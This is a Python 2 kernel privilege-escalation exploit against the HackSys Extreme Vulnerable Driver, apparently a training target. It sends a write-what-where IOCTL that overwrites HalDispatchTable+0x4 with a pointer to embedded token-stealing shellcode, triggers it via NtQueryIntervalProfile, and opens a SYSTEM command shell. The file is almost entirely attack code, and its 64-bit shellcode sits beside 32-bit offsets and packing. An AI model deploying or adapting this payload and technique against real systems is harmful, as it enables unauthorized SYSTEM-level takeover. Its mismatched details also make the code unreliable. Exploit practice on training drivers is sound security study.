import ctypes, sys, struct
from subprocess import *
from ctypes import *

kernel32 = windll.kernel32
ProcessStatusAPI = windll.psapi
ntdll = windll.ntdll

#Define the Class
class WriteWhatWhere(Structure):
    _fields_ = [
        ("What", c_void_p),
        ("Where", c_void_p)
    ]

#Get the Handle
generic_read = 0x80000000
generic_write = 0x40000000
open_existing = 0x00000003
file_attribute_normal = 0x00000080
DWSharedMode = 0
hTemplateFile = None
lpSecurityAttributes = None
# HANDLE WINAPI CreateFile(
#   _In_     LPCTSTR               lpFileName,
#   _In_     DWORD                 dwDesiredAccess,
#   _In_     DWORD                 dwShareMode,
#   _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
#   _In_     DWORD                 dwCreationDisposition,
#   _In_     DWORD                 dwFlagsAndAttributes,
#   _In_opt_ HANDLE                hTemplateFile
# );
hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", (generic_read|generic_write), DWSharedMode, lpSecurityAttributes, open_existing, file_attribute_normal, hTemplateFile)

if not hevDevice or hevDevice == -1:
		print '[+] Could not get handle. [*]'
		sys.exit(0)

#This will define the CTL_CODE
file_device_unknown = 0x00000022
file_any_access = 0x00000000
method_neither = 0x00000003
ctl_code = hex((file_device_unknown << 16) | (file_any_access << 14) | (0x802 << 2) | method_neither)
print "\n[*] CTL code is: " + ctl_code


#System Token Stealing Payload
print "[*] Stealing SYSTEM Token"
shellcode =  ""
shellcode += "\x48\x31\xc0" 	                    # xor rax, rax			; Zero Out rax
shellcode += "\x65\x48\x8b\x04\x25\x88\x01\x00\x00" # mov rax, [gs:188h]    		; Get nt!_KPCR.PcrbData.CurrentThread
shellcode += "\x48\x8b\x40\x70"			    # mov rax, [rax + 70h]    	   	; Get nt!_KTHREAD.ApcState.Process	
shellcode += "\x48\x89\xc1"			    # mov rcx, rax                  	; Copy current process _EPROCESS structure	
shellcode += "\x49\x89\xcb"			    # mov r11, rcx                  	; Store Token.RefCnt
shellcode += "\x49\x83\xe3\x07"			    # and r11, 7		
shellcode += "\xba\x04\x00\x00\x00"		    # mov rdx, 4h                   	; WIN 7 SP1 SYSTEM process PID = 0x4
shellcode += "\x48\x8b\x80\x88\x01\x00\x00"	    # mov rax, [rax + 188h]         	; Get nt!_EPROCESS.ActiveProcessLinks.Flink
shellcode += "\x48\x2d\x88\x01\x00\x00"		    # sub rax, 188h
shellcode += "\x48\x39\x90\x80\x01\x00\x00"	    # cmp[rax + 180h], rdx          	; Get nt!_EPROCESS.UniqueProcessId
shellcode += "\x75\xea"				    # jne	-22 <.text+0x1f>
shellcode += "\x48\x8b\x90\x08\x02\x00\x00" 	    # mov rdx, [rax + 208h]         	; Get SYSTEM process nt!_EPROCESS.Token	
shellcode += "\x48\x83\xe2\xf0"			    # and rdx, 0fffffffffffffff0h 	
shellcode += "\x4c\x09\xda"			    # or rdx, r11	
shellcode += "\x48\x89\x91\x08\x02\x00\x00"	    # mov[rcx+ 208h], rdx           	; Replace target process nt!_EPROCESS.Token
shellcode += "\x48\x83\xc4\x28" 		    # add rsp, 28			; Align the Stack
shellcode += "\xc3"				    # retq




# payload end
# payload's real memory address
# trick to get the real memory address of a variable value in python
ring0_payload_address = id(shellcode) + 32

# pointer to payload memory address
ring0_payload_pointer = struct.pack("L", ring0_payload_address)

# payload pointer's memory address
ring0_payload_pointer_address = id(ring0_payload_pointer) + 32

print "[*] Address of ring0 shellcode: {0}  ".format(hex(ring0_payload_address))
print "[*] Pointer for ring0 shellcode: {0} ".format(hex(ring0_payload_pointer_address))



	
cb = c_int(1024)
cb_needed = c_longlong()
image_base = (c_ulonglong * 1024)()
# BOOL WINAPI EnumDeviceDrivers(
# _Out_ LPVOID  *lpImageBase,
#   _In_  DWORD   cb,
#   _Out_ LPDWORD lpcbNeeded
# );
# enumerate the loaded device drivers
#Enumerate for the HALDispatchTable
enumerate = ProcessStatusAPI.EnumDeviceDrivers(byref(image_base), cb, byref(cb_needed))
if not enumerate:
	print "[*] Enumeration Device Drivers Failed! [*]"
	sys.exit(-1)
for address in image_base:
	if not address:
		continue
	get_base_name = c_char_p('\x00' * 1024)
	# DWORD WINAPI GetDeviceDriverBaseName(
    #   _In_  LPVOID ImageBase,
    #   _Out_ LPTSTR lpBaseName,
    #   _In_  DWORD  nSize
    # );
	ProcessStatusAPI.GetDeviceDriverBaseNameA.argtypes = [c_longlong, POINTER(c_char), c_uint32]
	get_driver_base_name =	ProcessStatusAPI.GetDeviceDriverBaseNameA(address, get_base_name, 48)
	if not get_driver_base_name:
		print "[*] Unable to Get Driver Base Name [*]"
		sys.exit(-1)
	if get_base_name.value.lower() == 'krnl' or 'krnl' in get_base_name.value.lower():
		base_name = get_base_name.value
		print "[*] Loaded Kernel: {0} ".format(base_name)
		print "[*] Base Address of Loaded Kernel: {0} ".format(hex(address))
		break
	else:
		print "[*] Unable to Get Kernel Base Name [*]"


kernel_handle = kernel32.LoadLibraryExA(base_name, None, 0x00000001)
if not kernel_handle:
    print "Unable to get Kernel Handle"
    sys.exit(-1)
 
hal_address = kernel32.GetProcAddress(kernel_handle, 'HalDispatchTable')
 
# Subtracting ntkrnlpa base in user space
hal_address -= kernel_handle
 
# To find the HalDispatchTable address in kernel space, add the base address of ntkrnpa in kernel space
hal_address += address
 
# Just add 0x4 to HAL address for HalDispatchTable+0x4
HAL_plus_4 = hal_address + 0x4
 
print "[+] HalDispatchTable    : {0}".format(hex(hal_address))
print "[+] HalDispatchTable+0x4: {0}".format(hex(HAL_plus_4))



#What-Where
www = WriteWhatWhere()
www.What = ring0_payload_pointer_address
www.Where = HAL_plus_4
wwwpointer = pointer(www)
 
print "[*] What :{0}".format(hex(www.What))
print "[*] Where:{0}".format(hex(www.Where))


dwIoControlCode = 0x22200b
exploit = wwwpointer
#exploit = wwwpointer
explLength = 0x10
lpOutBuffer = None
nOutBufferSize = 0
lpBytesReturned = byref(c_ulong())
lpOverlapped = None
# BOOL WINAPI DeviceIoControl(
    #   _In_        HANDLE       hDevice,
    #   _In_        DWORD        dwIoControlCode,
    #   _In_opt_    LPVOID       lpInBuffer,
    #   _In_        DWORD        nInBufferSize,
    #   _Out_opt_   LPVOID       lpOutBuffer,
    #   _In_        DWORD        nOutBufferSize,
    #   _Out_opt_   LPDWORD      lpBytesReturned,
    #   _Inout_opt_ LPOVERLAPPED lpOverlapped
    # );
    # send the control code with buffer to the vulnerable driver
kernel32.DeviceIoControl(hevDevice, dwIoControlCode, exploit, explLength, lpOutBuffer, nOutBufferSize, lpBytesReturned , lpOverlapped)

ntdll.NtQueryIntervalProfile(0x1337, byref(c_ulong()))
print "[*] Popping a NT/System Shell!!!  "
Popen("start cmd", shell=True)
